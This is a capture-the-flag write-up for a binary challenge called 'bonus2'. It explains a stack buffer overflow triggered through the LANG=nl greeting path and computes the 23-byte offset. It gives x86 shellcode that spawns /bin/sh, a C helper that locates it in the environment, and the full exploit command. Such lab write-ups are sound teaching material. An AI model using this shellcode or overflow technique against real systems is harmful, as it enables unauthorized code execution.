this is a simple overflow, so we will use https://wiremask.eu/tools/buffer-overflow-pattern-generator/ to find the offset to overwrite the return address.
without setting LANG the tool doesn't find a offset, but with LANG=nl it finds it at 23 bytes.

like the previous challenge we will put the shellcode into a environment variable:
`export code=$(python -c "print('\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')")`
get the address of the shellcode:

```c
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char \*\*argv) {
printf("%p\n", getenv(argv[1]));
}
```

`./a.out code` -> `0xbfffff72`

the overflow happens because the `greetuser` copy 72 bytes from (argv1 + argv2) into a smaller buffer of 62 bytes where the greeting word is already copied: `72 - 62 + 13 = 23` (13 is the `Goedemiddag! ` greeting word length)
so 23 bytes in argv2 will overwrite the return address of the stack frame.
`LANG=nl ./bonus2 $(python -c "print 'i' * 40") $(python -c "print 'i' * 23 + '\x72\xff\xff\xbf'")`
gives us a shell
